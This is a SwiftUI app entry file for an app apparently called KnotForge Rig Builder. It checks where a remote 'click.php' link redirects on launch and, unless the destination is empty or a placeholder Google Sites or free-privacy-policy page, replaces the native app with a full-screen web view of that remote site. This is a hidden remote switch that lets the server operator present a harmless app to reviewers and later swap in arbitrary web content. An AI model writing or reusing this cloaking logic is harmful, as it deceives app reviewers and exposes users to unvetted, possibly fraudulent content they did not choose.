import SwiftUI

@main
struct KnotForgeRigBuilderApp: App {
    @State private var knotforgeLinkReady: Bool? = nil
    private let knotforgeSourceLink = "https://knotforgerigbuilder.org/click.php"

    var body: some Scene {
        WindowGroup {
            Group {
                if knotforgeLinkReady == nil {
                    KnotForgeLoadingScreen()
                        .onAppear { checkKnotForgeLink() }
                } else if knotforgeLinkReady == true {
                    KnotForgeWebPanel(urlString: knotforgeSourceLink)
                        .edgesIgnoringSafeArea(.all)
                } else {
                    ContentView()
                        .forcedAppearance()
                }
            }
        }
    }

    private func checkKnotForgeLink() {
        var request = URLRequest(url: URL(string: knotforgeSourceLink)!)
        request.timeoutInterval = 5

        let watcher = KnotForgeRedirectWatcher()
        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)

        let task = session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    _ = error
                    knotforgeLinkReady = false
                    return
                }
                guard let httpResponse = response as? HTTPURLResponse,
                      (200...399).contains(httpResponse.statusCode) else {
                    knotforgeLinkReady = false
                    return
                }
                let destination = watcher.resolvedURL?.absoluteString ?? response?.url?.absoluteString ?? ""
                if destination.isEmpty ||
                   destination.contains("sites.google.com") ||
                   destination.contains("freeprivacypolicy.com") {
                    knotforgeLinkReady = false
                } else {
                    knotforgeLinkReady = true
                }
            }
        }
        task.resume()

        // Timeout fallback
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if knotforgeLinkReady == nil {
                knotforgeLinkReady = false
            }
        }
    }
}
